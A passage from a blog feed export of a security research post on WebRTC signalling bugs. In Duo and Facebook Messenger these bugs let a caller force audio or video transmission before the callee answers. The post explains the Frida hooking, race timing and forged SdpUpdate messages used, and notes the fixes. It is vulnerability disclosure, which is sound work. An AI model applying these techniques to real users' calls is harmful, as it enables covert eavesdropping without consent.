class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;I tested this by using Frida to alter the SDP sent by the callee, and then I tried many methods to win the race. It turned out to be fairly hard to win, and I spent roughly two weeks trying to figure out how to slow down the video disable call enough to give the connection time to set up. I ended up sending multiple offers and adding candidates to the offers, which decreased the connection time, as the network connection was already established. Then I sent many messages that take a long time to process through the data channel of the peer-to-peer connection to slow down the disabling of the video track. Data messages are processed on the same thread queue as disabling the video track in Duo, so sending data messages filled up the queue that was needed to disable video with many other entries, delaying the track being disabled.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;This &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2085&amp;q=duo&amp;can=1"&gt;bug&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was fixed in December 2020 by removing the asynchronous call from &lt;/span&gt;&lt;span class="c3"&gt;onSetSuccess&lt;/span&gt;&lt;span&gt;. While Duo generally designed signalling in a way that is effective in preventing video transmission from callee to caller, implementing the design asynchronously introduced problems. Asynchronous signalling implementations are becoming more common on mobile applications, as there are many unpredictable situations in which WebRTC needs to wait on the network or a peer, and separating function calls into different threads means a delay in one call won&amp;rsquo;t affect unrelated functionality. However, asynchronous calls make it more difficult to model how a state machine will behave in all situations, so it is important to be cautious about adding asynchronous calls to WebRTC signalling. In this case, the asynchronous call to disable the video track added nothing in terms of performance, as there is no reason any of the calls made to disable the track could block, and &lt;/span&gt;&lt;span class="c3"&gt;onSetSuccess&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;already runs in its own thread and can yield to higher priority threads. It&amp;rsquo;s important to balance the risk and benefit of asynchronous calls and not indiscriminately include them in an application.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c8" id="h.5vosihqq3qnz"&gt;&lt;span class="c9"&gt;Facebook Messenger&lt;/span&gt;&lt;/h1&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;I looked at Facebook Messenger in October 2020. It was a fairly challenging target because of the amount of reverse engineering required. &lt;/span&gt;&lt;span&gt;Stepping back&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;a bit, WebRTC has bindings in several programming languages which allow it to be integrated into applications using that language. Most Android applications that integrate WebRTC use the Java bindings. This makes investigating signalling state machines fairly straightforward, as important Java functions, such as setLocalDescription (which processes offers and answers), addRemoteIceCandidate (which processes candidates) and addTrack (which adds tracks to connections) can be hooked in Frida and logged for analysis. It is also reasonably straightforward to change the behavior of the attacker device using these calls.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;Facebook Messenger does not use Java bindings to integrate WebRTC, instead it uses C++ bindings. Moreover, it statically links WebRTC to a larger library (librtcR20.so, which is likely the rsys library mentioned in this &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://engineering.fb.com/2020/12/21/video-engineering/rsys/"&gt;article&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;), so the symbols for calls to bindings get stripped, making them difficult to hook. In addition, Facebook Messenger serializes SDP into another format before it is transmitted, so it is difficult to determine how signalling works by monitoring traffic.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;I eventually realized that the only reasonable way to figure out how Facebook Messenger signalling works was to figure out its network protocol. Thankfully, Facebook has publicly &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://engineering.fb.com/2014/02/20/open-source/under-the-hood-building-and-open-sourcing-fbthrift/"&gt;stated&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;that they use &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://github.com/facebook/fbthrift"&gt;fbthrift&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a branch of thrift. I loaded the librtcR20.so library into IDA to see if I could find where it called into the thrift library, but while there were a few calls, it looked like the code was mostly statically linked. I eventually figured out that this is because thrift generates serialization code for every protocol implemented, so most of the serialization and deserialization code ends up compiled with the protocol processing code. So I decided to compile fbthrift, make a sample serializer and look at it in IDA, so I could get an impression of what compiled fbthrift serializers look like. I noticed that during serialization, members of an object are serialized by calling a method called &lt;/span&gt;&lt;span class="c3"&gt;writeFieldBegin&lt;/span&gt;&lt;span&gt;. I also noticed that when this method is called, the field name is required, even though it is usually not included in the serialized output. So I looked for a function in librtcR20 that was very frequently called with different string parameters that seemed reasonable for field names. Not very many functions fulfilled that criteria, so I was able to identify &lt;/span&gt;&lt;span class="c3"&gt;writeFieldBegin&lt;/span&gt;&lt;span class="c0"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-gfMBuF2fQqI/YADm6csLE0I/AAAAAAAAapE/dtcDLU_HZ-kc-g_9bocWM3KnWA9LNKZVgCNcBGAsYHQ/s616/image1.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-gfMBuF2fQqI/YADm6csLE0I/AAAAAAAAapE/dtcDLU_HZ-kc-g_9bocWM3KnWA9LNKZVgCNcBGAsYHQ/s600/image1.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;At this point, I could find many places where objects are serialized, and needed to identify which one was the message used to set up WebRTC calls.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;Earlier, I&amp;rsquo;d noticed a method in the library called &lt;/span&gt;&lt;span class="c3"&gt;P2PCall::OnP2PMessageFromPeer &lt;/span&gt;&lt;span&gt;(note that the symbol for this method is stripped, but the method name is logged when it is called). This seemed a likely place that a deserialized message would be processed. Searching for the string &amp;ldquo;P2PMessage&amp;rdquo;, I found the serialization code for a type called &lt;/span&gt;&lt;span class="c3"&gt;P2PMessageRequest&lt;/span&gt;&lt;span class="c0"&gt;. I assumed that this was where call setup messages were created.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;Thrift serialization code is generated based on class definitions in a thrift definition file. Based on the field names and types passed to &lt;/span&gt;&lt;span class="c3"&gt;writeFieldBegin&lt;/span&gt;&lt;span class="c0"&gt;, I was able to slowly reverse engineer the complete thrift definition for this type. It was tedious work, because the definition was fairly long, and the code is obfuscated in a way that makes register use inconsistent, so I wasn&amp;rsquo;t confident that any automated approach would be accurate.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;Below is a sample of the serialization code.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-REQgUDhuPqw/YADm7SEzc-I/AAAAAAAAapQ/2f6OMqdwMM4Zw_soX3zvMjTNgeQ0B34XACNcBGAsYHQ/s558/image6.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-REQgUDhuPqw/YADm7SEzc-I/AAAAAAAAapQ/2f6OMqdwMM4Zw_soX3zvMjTNgeQ0B34XACNcBGAsYHQ/s558/image6.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;Notice that it writes two fields from an object of type &lt;/span&gt;&lt;span class="c3"&gt;Extmap&lt;/span&gt;&lt;span&gt;. The first, named &lt;/span&gt;&lt;span class="c3"&gt;id&lt;/span&gt;&lt;span class="c0"&gt;, is a mandatory field. The function that writes the code is as follows.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-7ZWnjqvGpyQ/YADm6WgR8-I/AAAAAAAAapA/7qBgnQlnSBEBmTELuyjhaejMNlGTbuDbwCNcBGAsYHQ/s416/image3.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-7ZWnjqvGpyQ/YADm6WgR8-I/AAAAAAAAapA/7qBgnQlnSBEBmTELuyjhaejMNlGTbuDbwCNcBGAsYHQ/s416/image3.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;The field identifier written is 1, and the field type is 8, which translates to i32 (32-bit integer). The second field is an optional field, and the registers to write it are set in the following code.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-nJV57uvnUCE/YADm6pdnZTI/AAAAAAAAapI/4of6CWuTDQ4n7-HckrNkfbG-Pw2VRYX5gCNcBGAsYHQ/s291/image4.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-nJV57uvnUCE/YADm6pdnZTI/AAAAAAAAapI/4of6CWuTDQ4n7-HckrNkfbG-Pw2VRYX5gCNcBGAsYHQ/s291/image4.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;This sets the field name to &lt;/span&gt;&lt;span class="c3"&gt;uri&lt;/span&gt;&lt;span class="c0"&gt;, the field identifier to 2, and the field type to 8 (also i32). All together, this code can be represented by the following thrift definition.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c7 c3"&gt;```&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c3 c7"&gt;struct Extmap{&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c7 c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;1: i32 id&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c7 c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2: optional i32 uri&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c7 c3"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c7 c3"&gt;```&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;After similarly reverse engineering every field of the &lt;/span&gt;&lt;span class="c3"&gt;P2PMessageRequest&lt;/span&gt;&lt;span&gt;&amp;nbsp;type, I had a complete thrift definition, available &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=469962&amp;signed_aid=P6IhymiSYdrgPEkUId-4yA=="&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;I did two things with this thrift definition. &amp;nbsp;First, I used it to determine the layout of the &lt;/span&gt;&lt;span class="c3"&gt;P2PMessageRequest&lt;/span&gt;&lt;span&gt;&amp;nbsp;type in C++. This was extremely valuable, as it allowed me to load the struct definition into IDA with every single field named correctly. This made it much easier to understand how incoming messages are handled in &lt;/span&gt;&lt;span class="c3"&gt;P2PCall::OnP2PMessageFromPeer&lt;/span&gt;&lt;span class="c0"&gt;. This ended up being a bit of a process. fbthrift can generate C++ header files directly from a thrift definition, but these are very long and contain a lot of unnecessary definitions, and can not be processed by IDA. So I ended up compiling the generated source and loading it into IDA, and then exporting the structure definitions and importing them into another IDA instance where librtcR20.so was already loaded. A few fields had different sizes in my compilation versus Facebook&amp;rsquo;s, but it was close enough that I could get it to work with a few modifications.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;Below is an example of code decompiled in IDA with the thrift definition imported, to give an idea of how much easier it makes it to understand the processing of the message object.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-SuzYVSKX1FU/YADm8hS_IfI/AAAAAAAAapc/PJRiwNLpNUEx3rBHSJtlUKPgWSOcz-orQCNcBGAsYHQ/s830/image9.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-SuzYVSKX1FU/YADm8hS_IfI/AAAAAAAAapc/PJRiwNLpNUEx3rBHSJtlUKPgWSOcz-orQCNcBGAsYHQ/s600/image9.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;I was also able to decode and generate messages sent over the network. To do this, I generated the serialization code from the thrift definition in Python, as thrift supports code generation in many languages. Then, I was able to import this code when using Frida Python to hook functions in Facebook Messenger.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;Then I needed to find the code that handled incoming &lt;/span&gt;&lt;span class="c3"&gt;P2PMessageRequest&lt;/span&gt;&lt;span&gt;&amp;nbsp;messages. Since these messages are handled by native code, meanwhile most Facebook messages are handled by Java code, I looked for a native call with an appropriate name. I found &lt;/span&gt;&lt;span class="c3"&gt;com.facebook.webrtc.WebrtcEngine.onThriftMessageFromPeer&lt;/span&gt;&lt;span class="c0"&gt;. I hooked this method with Frida, and fed its byte array parameter in the generated deserializer, and it decoded incoming messages.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;I found a similar method used to send thrift messages, &lt;/span&gt;&lt;span class="c3"&gt;sendThriftToPeer&lt;/span&gt;&lt;span&gt;&amp;nbsp;(this method&amp;rsquo;s class name is obfuscated and changes in every version of Facebook Messenger, but it can be found by grepping the application&amp;rsquo;s smali). I was also able to hook this method, and alter its byte array parameter, to change a &lt;/span&gt;&lt;span class="c3"&gt;P2PMessageRequest&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;message sent by Facebook Messenger.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;Now, I was able to understand Facebook Messenger&amp;rsquo;s signalling state machine. There are two different ways that signalling can occur, depending on where the user is signed into Facebook Messenger. If the user is signed in on multiple devices or browsers, very little happens before the callee interacts with their device. &lt;/span&gt;&lt;span&gt;The offer, answer and candidates are exchanged, but they are stored by the callee device and not processed until the callee user answers the call.&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;This makes sense, because Facebook Messenger doesn&amp;rsquo;t know what device to connect to otherwise.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;If the callee is only signed in on a single device, the state machine is more interesting.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-k0XSw5oXzQg/YADm72A0a4I/AAAAAAAAapU/d5d36-DjceMC82mNQPVoKkyxNV7afepdwCNcBGAsYHQ/s934/image7.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-k0XSw5oXzQg/YADm72A0a4I/AAAAAAAAapU/d5d36-DjceMC82mNQPVoKkyxNV7afepdwCNcBGAsYHQ/s600/image7.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;In this case, Facebook Messenger enables the track as soon as an offer is received, but alters the offer so that all outgoing streams are inactive. It then replaces the offer with one where they are active when the user interacts with the device.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;I was concerned that there might be a way to bypass the alteration of the offer, but I looked at how this was done, and while I generally don&amp;rsquo;t recommend using anything other than adding or disabling tracks to disable input device transmission, it was fairly robust. The offer is altered after the SDP is decoded into an internal WebRTC object, and the changes are made directly to this object, which eliminates the possibility of parsing errors.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;However, looking at how incoming messages are handled, I noticed that many message types other than offers, answers and candidates are processed before the call is answered. One type that stood out was called &lt;/span&gt;&lt;span class="c3"&gt;SdpUpdate&lt;/span&gt;&lt;span&gt;. When an &lt;/span&gt;&lt;span class="c3"&gt;SdpUpdate&lt;/span&gt;&lt;span&gt;&amp;nbsp;message is received, the local offer or answer is updated by calling &lt;/span&gt;&lt;span class="c3"&gt;setLocalDescription&lt;/span&gt;&lt;span class="c0"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;This message type didn&amp;rsquo;t do anything when sent to the state machine above, as it is already storing SDP and waiting to call &lt;/span&gt;&lt;span class="c3"&gt;setLocalDescription&lt;/span&gt;&lt;span&gt;. But in the situation where the user is logged into two devices, it caused &lt;/span&gt;&lt;span class="c3"&gt;setLocalDescription&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;to be called and started the audio connection.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;It is not clear what the &lt;/span&gt;&lt;span class="c3"&gt;SdpUpdate&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;message type is used for in Facebook Messenger. I tried many scenarios on my test devices, including network switchover, and was not able to generate one in normal use. Regardless, it is clear that it was not intended for this message type to be received before the call is answered. It is similar to the Signal bug described above, in that it is not related to the application&amp;rsquo;s use of WebRTC, but due to a missing check when handling input that can cause state transitions.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;This &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2098&amp;q=label%3AFinder-natashenka&amp;can=1&amp;start=200"&gt;vulnerability&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;was fixed in November 2020 with server changes that prevent this message type from being sent before a call is connected.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c8" id="h.8r897r2revb3"&gt;&lt;span class="c9"&gt;Other Applications&lt;/span&gt;&lt;/h1&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;There were a few other applications I looked at and did not find problems with their state machines. I looked at Telegram in August 2020, right after video conferencing was added to the application. I did not find any problems, largely because the application does not exchange the offer, answer or candidates until the callee has answered the call. I looked at Viber in November 2020, and did not find any problems with their state machine, though challenges reverse engineering the application made this analysis less rigorous than the other applications I looked at.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c8" id="h.zc0ddbgboimw"&gt;&lt;span class="c9"&gt;Discussion &lt;/span&gt;&lt;/h1&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;The majority of calling state machines I investigated had logic vulnerabilities that allowed audio or video content to be transmitted from the callee to the caller without the callee&amp;rsquo;s consent. This is clearly an area that is often overlooked when securing WebRTC applications.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;The majority of the bugs did not appear to be due to developer misunderstanding of WebRTC features. Instead, they were due to errors in how the state machines are implemented. That said, a lack of awareness of these types of issues was likely a factor. It is rare to find WebRTC documentation or tutorials that explicitly discuss the need for user consent when streaming audio or video from a user&amp;rsquo;s device.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;Many of these state machines had needless complexity in how they handled call set-up, which was also a factor. Unnecessary threading, reliance on obscure features and large numbers of states and input types increase the likelihood of this type of vulnerability occurring in a signalling state machine.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;It is also concerning to note that I did not look at any group calling features of these applications, and all the vulnerabilities reported were found in peer-to-peer calls. This is an area for future work that could reveal additional problems.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c8" id="h.vabt8649d9j7"&gt;&lt;span class="c9"&gt;Conclusion&lt;/span&gt;&lt;/h1&gt;&lt;p class="c2"&gt;&lt;span class="c11"&gt;I investigated the &lt;/span&gt;&lt;span&gt;signalling&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;state machines of seven video conferencing &lt;/span&gt;&lt;span&gt;applications &lt;/span&gt;&lt;span class="c11"&gt;and found five vulnerabilities that could allow a caller &lt;/span&gt;&lt;span class="c0"&gt;device to force a callee device to transmit audio or video data. All these vulnerabilities have since been fixed. It is not clear why this is such a common problem, but a lack of awareness of these types of bugs as well as unnecessary complexity in signalling state machines is likely a factor. Signalling state machines are a concerning and under-investigated attack surface of video conferencing applications, and it is likely that more problems will be found with further research.&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/6291003668138377503/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/01/the-state-of-state-machines.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/6291003668138377503" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/6291003668138377503" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/01/the-state-of-state-machines.html" title="The State of State Machines" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-3WEtXcOMSJ8/YADm6aUFTfI/AAAAAAAAao8/VnztmKLwoFsJOFS413fG9j83nxIxW_cfwCNcBGAsYHQ/s72-c/image2.jpg" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-7224812645464338214</id>
    <published>2021-01-14T09:04:00.001-08:00</published>
    <updated>2021-02-04T13:12:35.715-08:00</updated>
    <title type="text">Hunting for Bugs in Windows Mini-Filter Drivers</title>
    <content type="html">&lt;style type="text/css"&gt;ul.lst-kix_j703njnsekbb-2{list-style-type:none}ul.lst-kix_j703njnsekbb-3{list-style-type:none}ul.lst-kix_j703njnsekbb-4{list-style-type:none}ul.lst-kix_j703njnsekbb-5{list-style-type:none}ul.lst-kix_j703njnsekbb-6{list-style-type:none}ul.lst-kix_j703njnsekbb-7{list-style-type:none}ul.lst-kix_j703njnsekbb-8{list-style-type:none}.lst-kix_j703njnsekbb-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_j703njnsekbb-0{list-style-type:none}ul.lst-kix_j703njnsekbb-1{list-style-type:none}ul.lst-kix_itnic84mr100-8{list-style-type:none}.lst-kix_itnic84mr100-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_itnic84mr100-6{list-style-type:none}ul.lst-kix_itnic84mr100-7{list-style-type:none}ul.lst-kix_itnic84mr100-4{list-style-type:none}.lst-kix_itnic84mr100-2&gt;li:before{content:"\0025a0  "}.lst-kix_itnic84mr100-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_itnic84mr100-5{list-style-type:none}ul.lst-kix_itnic84mr100-2{list-style-type:none}ul.lst-kix_itnic84mr100-3{list-style-type:none}ul.lst-kix_itnic84mr100-0{list-style-type:none}.lst-kix_itnic84mr100-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_itnic84mr100-1{list-style-type:none}.lst-kix_itnic84mr100-6&gt;li:before{content:"\0025cf  "}.lst-kix_itnic84mr100-7&gt;li:before{content:"\0025cb  "}.lst-kix_itnic84mr100-4&gt;li:before{content:"\0025cb  "}.lst-kix_itnic84mr100-8&gt;li:before{content:"\0025a0  "}.lst-kix_j703njnsekbb-1&gt;li:before{content:"\0025cb  "}.lst-kix_itnic84mr100-5&gt;li:before{content:"\0025a0  "}.lst-kix_j703njnsekbb-0&gt;li:before{content:"\0025cf  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_j703njnsekbb-6&gt;li:before{content:"\0025cf  "}.lst-kix_j703njnsekbb-7&gt;li:before{content:"\0025cb  "}.lst-kix_j703njnsekbb-5&gt;li:before{content:"\0025a0  "}.lst-kix_j703njnsekbb-2&gt;li:before{content:"\0025a0  "}.lst-kix_j703njnsekbb-3&gt;li:before{content:"\0025cf  "}.lst-kix_j703njnsekbb-4&gt;li:before{content:"\0025cb  "}ol{margin:0;padding:0}table td,table th{padding:0}.c18{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#dd7e6b;border-left-style:solid;border-bottom-width:1pt;width:132pt;border-top-color:#000000;border-bottom-style:solid}.c39{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#d9d9d9;border-left-style:solid;border-bottom-width:1pt;width:130.5pt;border-top-color:#000000;border-bottom-style:solid}.c46{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:bottom;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#ffe599;border-left-style:solid;border-bottom-width:1pt;width:16.5pt;border-top-color:#000000;border-bottom-style:solid}.c63{border-right-style:solid;padding:2pt 2pt 2pt 